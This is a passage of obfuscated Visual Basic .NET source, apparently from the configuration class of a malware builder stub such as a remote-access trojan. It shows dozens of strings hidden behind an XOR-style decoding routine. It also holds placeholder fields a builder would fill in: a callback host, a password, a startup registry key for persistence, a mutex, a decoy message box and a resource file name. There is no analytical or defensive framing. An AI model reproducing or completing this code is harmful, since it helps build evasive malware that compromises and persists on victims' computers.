    Public Shared q544p As String = Module1.q256p("wchfcNWHKrPTWZRZJGocYlExTBdFwGLZULyKvOgdXkubxACSYwxsKxkxxudIuOErwDUdTsUdAUJDCeeCxUUgludlR", "4B")
    Public Shared q545p As String = Module1.q256p("kdLFeigQBvpIjRUArdoVwSecFzBgdfpvGJxSRnbzgeNzYplpFNGfQnwXHaHgxbJfIzyrXYmSSVr", "207C")
    Public Shared q546p As String = Module1.q256p("RJbhreTaEiZDdEUBusFwheTgaHRjhXHGwvvlDZEKPRoxYxotYxvSSiCgwPxFCYCUmgovJWcFcbh", "63")
    Public Shared q547p As String = Module1.q256p("RkbznQRgpsyCWkvyZrreXJCOnuuLSQnkhPDJWYxvZItonXUKnVbTyUyVkaJVgJdhbVHSPPWAZvdyb", "2F")
    Public Shared q548p As String = Module1.q256p("EZhbXXiRAzyVgLKvBbdVckdkWUPuSKhXwCSKsUaHfntdUemJZHpHlKzAXlAbsPgfyxvsiHjeT", "141D0F08390D")
    Public Shared q549p As String = Module1.q256p("NBtECFKkJiOryDHUlmJJjTARXeFCvNFUIGxjRdIeaoPGYijvhWeFKHaspHnXGGWoeRtargVFOgODcFwiFeiUyhYFGWwzr", "061D332A222E")
    Public Shared q550p As String = Module1.q256p("fRVSkrmTntbSQWQOcdmYtVnRHWonnvElSkFJusnjkcLcZaeWvcjhUcIjIzwFRRJFpdWcVbvzcllNmEHivZlEJvbmWQpWAlgUKPS", "7D")
    Public Shared q551p As String = Module1.q256p("vALUCdjsfgmZOXocwmZufXxvfcLzXrtTQXSlpkPeDjVJgbEflDKVKlxWUsQlSODmgyDAsdZUcUDIyEQOsSGg", "0C3939370D1A1F1F")
    Public Shared q552p As String = Module1.q256p("uzXgjjPbUulzxnWQsnlKIfeFjKvbgRthEnxbBKiNkCeNEeDWlRnopdbEtEKloNclpssFhQJfpUhilDPaJtYPO", "50")
    Public Shared q553p As String = Module1.q256p("LEThjJwJFKrvSGxBArVzWJrYnjUOghDDYNXdLBfEuNPwTuuGhrjxjVBchppIcvKkIsaTynXgGxhXIIvy", "16210A1E38162932")
    Public Shared q554p As String = Module1.q256p("RLXDeEXvPQWnzcgrfBtxzmomgIEoCOQxuJnJYDwstukiwEOEDyaPnzoLCEyJcnQskyYpCybgAJgPgy", "61")
    Public Shared q555p As String = Module1.q256p("ekGjdmflrmsAYJCkEyIcVuCUlomdNielECEcSDPKNlQvLavEFEvQdUmPZzjhoEdTzAmaPJUJpFsVttGxniuprKERdnJJcXJ", "2A230E")
    Public Shared q556p As String = Module1.q256p("yIKwvchNGLvHhzbViIluatbVEQBdxchQoWBRXObLtJLQodkGrWJGkBFPXAviVGLcwppQcuh", "62")
    Public Shared q557p As String = Module1.q256p("ISQaZxkJdbfAUxxSTCWkAggalwHDhLcFHbtclKjGoYVfCuNIYXTfStbJfxcWgTsyZuOZdVSbQJDxakvoUusLQaNm", "17340233150A26")
    Public Shared q558p As String = Module1.q256p("LEThjJwJFKrvSGxBArVzWJrYnjUOghDDYNXdLBfEuNPwTuuGhrjxjVBchppIcvKkIsaTynXgGxhXIIvyRLXDeEXvPQW", "6B")
    Public Shared q559p As String = Module1.q256p("msAYJCkEyIcVuCUlomdNielECEcSDPKNlQvLavEFEvQdUmPZzjhoEdTzAmaPJUJpFsVttGxniuprKERdnJJcXJyIKwvchNGLvHh", "3C2434072A05300A")
    Public Shared q560p As String = Module1.q256p("zbViIluatbVEQBdxchQoWBRXObLtJLQodkGrWJGkBFPXAviVGLcwppQcuhISQaZxkJdbfAUxxSTCWkAggalwHDhLcFHbtclKjGo", "3D")
    Public Shared q561p As String = Module1.q256p("YVfCuNIYXTfStbJfxcWgTsyZuOZdVSbQJDxakvoUusLQaNmwvhJZFauwoxaBATHogeDJGkbRGRs", "19032E05223C2A")
    Public Shared q562p As String = Module1.q256p("szTlWvTrEsBCNDcFNgpLwlLuuhcRjjFjxcDcKOcVIWdTJnXhPZhzwjNJTYgQGSyEvtnLQcV", "51")
    Public Shared q563p As String = Module1.q256p("NYEUyahwovERJrctjYWYkXJTbHptfJVlPGeGmsYXVOwOBwVthTFrrRkvWHnktcTJTOFvGKLHaJtfVFdafCggKOJJjDKZ", "16203836110D192D04243121171707")
    Public Shared q564p As String = Module1.q256p("dzRzsTIotIDIvaQBJxmEPeOZluvJzvJbKQphyBhUjSkGpjtQnYekikJUBDRYaXkYYJKLJgRQ", "01")
    Public Shared q565p As String = Module1.q256p("RhvlBWTnexoOosxyULbvlLsrZrnHJFsnADcnlfFEEUyKgrhVkOzzkssvUfPYYyrofcThDZWxwfpINjfAiTYULSy", "27130174")
    Public Shared q566p As String = Module1.q256p("cFgPcDbDdHZdNBAWOnoIUSzrQrxnjBwOUEeKkNhzkzfYLgTTNCfFJcIQQiBaYPuOHJbyQTtviokNYhvntnbVgpQlW", "3B")
    Public Shared q567p As String = Module1.q256p("cgtIzEAvYxruooJgorLSWGNWtUkhPcxsAocURHikwJCjdVavzkBTWiZeGKfVnKcdYRnOJtpurEVdlZmdStiBD", "2811244F")
    Public Shared q568p As String = Module1.q256p("FNfOUBvrApfUzWXEVJcJTbrezvzIaboBhrFKfGANgnXCQZTvFHZoJOXDJJmHRpjnZAxBQNbJjyATSFJCrDdhrXNgElssiYTS", "01032264")
    Public Shared q569p As String = Module1.q256p("ysInhDjBcGFYzTOTtDtokbvSrZfrJeiPgDsdQUYuVxlrZQcCfRrFnExoHdskvHibDTJhtUQLlIpXzFpQeJDjvWwO", "49")
    Public Shared q570p As String = Module1.q256p("ByJrBNLLapBLZiogekZfLDyFFsuUtUnVajYfjywVHvnnScKxxfdtGFkvNLQDloXWGUlBzjdJZuXUZJkEDoGvEtrDNwOVixQZ", "362F1F75")
    Public Shared q571p As String = Module1.q256p("pDOdrXQPtwVsZbphJSglASvYaVgwkYxIHKarfsBaOXggJJxoTigSPnRdwgVrSyKgXrYQAbDDtTQGvBoPLHQNSp", "0B2A0911373C3D15")
    Public Shared q572p As String = Module1.q256p("OhAHcyUuPjyIETDCsoKFkSJxTzWmTJkgAgppfpWBcjPdLkrVgPNxznKgAJnisfNwkKhkokmCeJtILJcJpCktjOpApbCnNb", "54")
    Public Shared q573p As String = Module1.q256p("JKspONJRxhJfLUaVFOtnuOJnwEUAkhUzEIOoLVJVojHfVVSXaCuGHCnXpQxYelHtftDsJBGmPhylfbkIvDnbUPNeRrUpQbN", "04161D1F2B383B170C")
    Public Shared q574p As String = Module1.q256p("YJhZSkAWsZmNeBShsbPhBaOrArmmuuzrBNTwUJxRpPsYSRBxUiHKAFOgnYtuVfATsAsjrbkUzCHtlxTfCvhCL", "74")
    Public Shared q575p As String = Module1.q256p("CmkGtuLdzJdlhmBODnkAYkReAbRpaYtNCZSVxDxnDFIciPiwjYlPEhsbbzNlzBjgdOWCnTkayFnnlrBYhnlD", "220E2A250029170E230B02")
    Public Shared q576p As String = Module1.q256p("KZsunipQDPJrdYNJaYOCQWxmFXUBoZVxBcLTxQHPWwOZknXWnaRfWHrRbWfOkIDlgiFzTfcZk", "65")
    Public Shared q577p As String = Module1.q256p("dyjVeCadUaIQfuPopeadmOHnkHNnaJaoUdDmuKFzpLIZFdZDiyyfdtYQjYwnyETXmfNknCbJidGydrf", "360F3B112A0D0030")
    Public Shared q578p As String = Module1.q256p("cKYZGIHBgjYVVKluQyhlXSsyzJBImgfHJpLogmjZPOSklSDFSKQxIudJtxeLmKbcGJTzyRbzIYELt", "35")
    Public Shared q579p As String = Module1.q256p("jPHDItPXBIEJfUQWzljbDzyOOGbrbGRQDWAzoiKidybzISTBBRbYUdSxEwoFnGmtfegxEDtLPfnJDZng", "1F2D29041D3E2D31")
    Public Shared q580p As String = Module1.q256p("lJSpvkpOwJWSCPVagSBHtlfeyJPXiXPJfIYtQGTZFLTtiUEdHONxwFJEghyPGtJVnGOaoFUQJnzlkJJUcyzsPcs", "67")
    Public Shared q581p As String = Module1.q256p("UVmJViQfpJXubOWDZIJXUDgoJrFiulhrPCNLLxzOSBOVHhyKmspdJChdymmjwgTSuwQXJADWcFOdBlOFIfvxHANWVnJVFJmo", "19082726052415")
    Public Shared q582p As String = Module1.q256p("lBImySrcsuYBrycPGEizcVWYFJgtvyunGTyvRUpGLIudXGmFzZVfPneVeaLLHWIkDUnHubzfgo", "7F")
    Public Shared q583p As String = Module1.q256p("ANvJwJHtTenPLirQKAPldfZAnQUYJhkbEkQhatkSUJPAIOgmCUiArGzuHLNxRbhkHfrUpfEwJnskrttCrBwlsmOiXcpyZ", "011327383A2D1A16170F33270C0622")
    Public Shared q584p As String = Module1.q256p("fEEpGNryDJlIpNkyXAYLBfrXSaKPUeBZdQAbNdAulbUCXZpAPyjEILhjclIOcnkJCRigAOlxlVUhKSyTCiFdNkkWKRPEJvvUAp", "1E")
    Public Shared q585p As String = Module1.q256p("tfmaJylKozUJvxsxZvyNnHhdUBKJEIYPmtDKvzSiVGOEvvwgkJVUVuIHfTlbNBUEoxVpTzbYDgAyxDAaXVYuy", "29080C7C")
    Public Shared q586p As String = Module1.q256p("JlQltIkwJmiSDZbWfIWTbgjRFzEbYtxpXZVPtIlCsKAxyPbEpVkVCAygQBJOxvlbOSnefxxN", "31")
    Public Shared q587p As String = Module1.q256p("vDomFktXhXvJbJzJefdzVIAsaKnsdZzQTccNIAfXJtaHTXelYKlkBJXJOrlVKssKDXwIfzSFJVeKrxNgkCEzyA", "0B0A0073")
    Public Shared q588p As String = Module1.q256p("lzslEyklJClCxdhFDCctxbmspSxxssVVthwaczHzwvfBCEcgrQZNIKEvblCIJPdewDsrcTYgGmKRtzgHbDlssj", "26")
    Public Shared q589p As String = Module1.q256p("AeKeisTETpthVWZQRutcCfsnWhXdChmwoyCdiIuTOzpXvtjCjZKvNRKIDXlXFKZYwUNptbHTuPawJhrInP", "2A2E0858")
    Public Shared q590p As String = Module1.q256p("ISuwrOSPOsotFSuOJoipSjYieDuOWxPmHBciThdTJctAPRifpmnlZRGJUPOJiNIkCtrmKlIOT", "68")
    Public Shared q591p As String = Module1.q256p("HJIZQLxocsQfukTADEtgsNgocaRAYKBNWzZDbQiRdEojJAUPTXozFckfgNCnFiWZeraCapQ", "052C3766")
    Public Shared q592p As String = Module1.q256p("lsYSWftCCaCEDUQWpVUyZJEzdRBrYmzWxORifxYERCJJrxVZFKsYEhYQAzgNdoHfYFTQCVumniRkvZvmyACB", "54")
    Public Shared q593p As String = Module1.q256p("SyVNJHyTsVVLZwGQVKdJEwmGxCRjAPCJswgSJBUkNPPXpQzPHnOnLZPLkhecicznwFsuFlwHVyRZlRnEPNwRSrh", "3633232927143912")
    Public Shared q594p As String = Module1.q256p("EOKmGLzcUPgcGFucxQNfKjmdIatBuXJQAJwRWWFaJIoEBOTBJroczBEFQPmaiJknsyBVUWtZn", "63")
    Public Shared q595p As String = Module1.q256p("fgfUgeSnNlPXgecIENkPzBkuwzhuRzOsVxsFEKdVHzHlrsiYavwJErdyVBdeTwIEohtRxBdGKNdHgxpCeQCvgJ", "280338370021072108")
    Public Shared q596p As String = Module1.q256p("zPjRbcmgNBdJnZLewWjwFuFFIinrHLcmScQCRgobZtUTySxaJICaomYGHJZDyYZvAGXAgIWGnlKWRnxHYLBk", "7E")
    Public Shared q597p As String = Module1.q256p("AZWYYkJIUaUZTcVosTmUZlCxRJRCLdAaPzmWxzvdwnmouHrEeuCskTOCJJSydJwRaCcDfcjvZ", "153234081E2F3A21083A34")
    Public Shared q598p As String = Module1.q256p("ncQOlTDcfGFXTjCJEonjFFsyIaGlwDBVfjdlJNFBwBKFZhsgyzliVOVNQHHSPxOFFrYkmIfcmzdaewWXvxwDPBEYRVZZCx", "4C")
    Public Shared q599p As String = Module1.q256p("gpsTZGyBClIZUsRZIxUoJTWpJRDJTIldTIbGcStzObEbpNBjlhPWSWeIvQxrrfckcXTTcKBfpxdCoKFPbkOnTFKJgysKYAPtmUI", "3F16392E2E152626")
    Public Shared q600p As String = Module1.q256p("ApQlwhFLgDEIvLiRDsUowywlPQPOXYvORNzLyJzwlWYCCZlvRruFJOADSrFXsRNIRomRDxHayQygUFOhEzcg", "10")
    Public Shared q601p As String = Module1.q256p("xGxLoWbVxiBIJCNmKVEgxrioZdKaLvPwlfpNbsLjDywPtYtBydngpvZioCpiXWyUwGAKOzJWNdJGvnSTxwisjCEKGLPau", "1C")
    Public Shared q602p As String = Module1.q256p("VJUGdaXKhJifkCeLJWFwtdpHDdngkZlaBCQylHYQfXIwpicFDafzpcizvyAXRnPrAPDlZaS", "17")
    Public Shared q603p As String = Module1.q256p("CEjYPWwCOXrzSujotNjQadtpUVsiCPdOZbiEOpfOphgKAPUfJFeZmtlZJnUCgmnrkfWNzZmIsfVSSOVncocEsZVAnLi", "210B2D31")
    Public Shared q604p As String = Module1.q256p("JHtRyusOmsQxSHyjgsFNDDjTNJnRuEVSpGdsGpULETHYxUtbWjCczBRJGRRFPVmBOGHeaxJJLAcGdJmRoR", "2A0D261C06")
    Public Shared q605p As String = Module1.q256p("GFuJaebNNzRTTIJpcLhPVrQEgUbuYGIcpZurnYWmQADlENrkBApBcLnViHeEKjTdAjzGPUQvZwWpI", "66")
    Public Shared q606p As String = "127.0.0.1"
    Public Shared q607p As String = "|Identification|"
    Public Shared q608p As String = "|Pass|"
    Public Shared q609p As String = "|MyStartupKey|"
    Public Shared q610p As String = "|MyMutex|"
    Public Shared q611p As String = "|MessageBoxText|"
    Public Shared q612p As String = "|MessageBoxTitle|"
    Public Shared q613p As String = "|MyResourceFileName|"
End Class